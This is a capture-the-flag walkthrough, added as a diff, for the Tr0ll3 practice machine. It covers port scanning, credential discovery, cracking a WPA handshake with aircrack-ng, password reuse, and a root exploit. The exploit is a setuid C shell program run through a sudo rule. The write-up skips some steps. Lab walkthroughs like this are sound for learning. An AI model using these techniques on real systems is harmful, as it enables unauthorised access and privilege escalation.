@@ -1,0 +1,181 @@
+nmap 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:d1:ea:d0:a8:1e:83:ef:c7:4f:ae:4c:bb:d6:75:19 (RSA)
+|   256 24:5f:cb:ef:3a:db:b5:59:c6:15:51:b9:2b:9b:fa:39 (ECDSA)
+|_  256 8b:96:de:4a:11:45:a7:f9:eb:60:9b:45:da:1a:21:de (ED25519)
+MAC Address: 08:00:27:04:D1:16 (Oracle VirtualBox virtual NIC)
+
+Then do -p- only ssh port is open.
+
+credentials for login are terminal start:here
+
+start@Tr0ll3:/home$ ls -R -lah
+
+./start:
+total 40K
+drwx------  7 start start 4.0K Aug  2  2019 .
+drwxr-xr-x 10 root  root  4.0K Jun 19  2015 ..
+drwxrwxr-x  2 start start 4.0K Jun 19  2015 ...
+-rw-r--r--  1 start start  220 Jun 17  2015 .bash_logout
+-rw-r--r--  1 start start 3.6K Jun 17  2015 .bashrc
+drwxrwxr-x  2 start start 4.0K Jun 18  2015 bluepill
+drwx------  2 start start 4.0K Jun 17  2015 .cache
+drwx------  3 start start 4.0K Aug  1  2019 .gnupg
+-rw-r--r--  1 start start  675 Jun 17  2015 .profile
+drwxrwxr-x  2 start start 4.0K Jun 17  2015 redpill
+
+./start/...:
+total 12K
+drwxrwxr-x 2 start start 4.0K Jun 19  2015 .
+drwx------ 7 start start 4.0K Aug  2  2019 ..
+-rw-rw-r-- 1 start start   13 Jun 19  2015 about_time
+
+./start/bluepill:
+total 12K
+drwxrwxr-x 2 start start 4.0K Jun 18  2015 .
+drwx------ 7 start start 4.0K Aug  2  2019 ..
+-rw-rw-r-- 1 start start   18 Jun 17  2015 awesome_work
+
+./start/.cache:
+total 8.0K
+drwx------ 2 start start 4.0K Jun 17  2015 .
+drwx------ 7 start start 4.0K Aug  2  2019 ..
+-rw-r--r-- 1 start start    0 Jun 17  2015 motd.legal-displayed
+
+./start/.gnupg:
+total 12K
+drwx------ 3 start start 4.0K Aug  1  2019 .
+drwx------ 7 start start 4.0K Aug  2  2019 ..
+drwx------ 2 start start 4.0K Aug  1  2019 private-keys-v1.d
+
+./start/.gnupg/private-keys-v1.d:
+total 8.0K
+drwx------ 2 start start 4.0K Aug  1  2019 .
+drwx------ 3 start start 4.0K Aug  1  2019 ..
+
+./start/redpill:
+total 12K
+drwxrwxr-x 2 start start 4.0K Jun 17  2015 .
+drwx------ 7 start start 4.0K Aug  2  2019 ..
+-rw-rw-r-- 1 start start   17 Jun 17  2015 this_will_surely_work
+ls: cannot open directory './step2': Permission denied
+ls: cannot open directory './wytshadow': Permission denied
+
+
+start@Tr0ll3:~/redpill$ ls
+this_will_surely_work
+start@Tr0ll3:~/redpill$ cat this_will_surely_work
+step2:Password1!
+
+
+start@Tr0ll3:~/bluepill$ ls
+awesome_work
+start@Tr0ll3:~/bluepill$ cat awesome_work
+http://bfy.tw/ODa
+
+
+start@Tr0ll3:/home$ find / -type f -perm 0777 2>/dev/null
+/var/log/.dist-manage/wytshadow.cap
+/var/crash/.lock
+/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
+
+
+got gold_star.txt dictonary password file & cap file
+
+a .cap file is used to save the 4-way EAPOL handshake when a device connects or reconnects to a router. 
+
+The EAPOL (Extensible Authentication Protocol over LAN) 4-Way Handshake is a security process used in WPA, WPA2, and WPA3 wireless networks to verify mutual knowledge of a shared key and derive session-specific encryption keys
+
+
+use aircrack-ng to crack
+
+#  BSSID              ESSID                     Encryption
+
+   1  18:D6:C7:3F:23:89  wytshadow                 WPA (1 handshake)
+   
+   
+   KEY FOUND! [ gaUoCe34t1 ]
+
+
+get into ssh using above credentials 
+
+wytshadow@Tr0ll3:/home$ cd wytshadow
+wytshadow@Tr0ll3:~$ ls
+oohfun
+wytshadow@Tr0ll3:~$ file oohfun
+oohfun: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=309f4fec949b0e2eb3f6ec83ccadff89c553e397, not stripped
+
+server {
+        listen 8080 default_server;
+        listen [::]:8080 default_server;
+                if ($http_user_agent !~ "Lynx*"){
+    return 403;
+}
+
+Lynx is a lightweight, open-source text-only web browser designed for command-line interfaces and terminal environments.
+
+if ($http_user_agent !~ "Lynx*") : Your server will only allow access to visitors using the Lynx browser.
+
+if not install lynx on kali, install it , apt install lynx
+
+lynx http://192.168.1.183:8080
+
+credentails: genphlux:HF9nd0cR!  
+
+get into genphlux ssh shell
+
+got a ssh key for maleus 
+
+ssh maleus@192.168.1.183 -i maleus
+
+.viminfo file :
+
+# Registers:
+""1     LINE    0
+        passwd
+"2      LINE    0
+        B^slc8I$
+"3      LINE    0
+        passswd  
+
+B^slc8I$ is password for maleus user
+
+maleus@Tr0ll3:~$ sudo -l
+[sudo] password for maleus: 
+Matching Defaults entries for maleus on Tr0ll3:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User maleus may run the following commands on Tr0ll3:
+    (root) /home/maleus/dont_even_bother
+
+To execute dont_even_bother file we need a password but we dont have so in this case
+
+create exploitable c file
+
+#include <unistd.h>  
+int main() {  
+    setgid(0); // Set group ID to root (0)  
+    setuid(0); // Set user ID to root (0)  
+    execl("/bin/sh", "sh", NULL); // Launch shell  
+    return 0;  
+}  
+
+sudo /home/maleus/dont_even_bother
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# cd /root
+# ls
+flag.txt
+# cat flag.txt
+You are truly a Jedi!
+
+Twitter Proof:
+
+Pr00fThatTh3L33tHax0rG0tTheFl@g!!
+
+@Maleus21
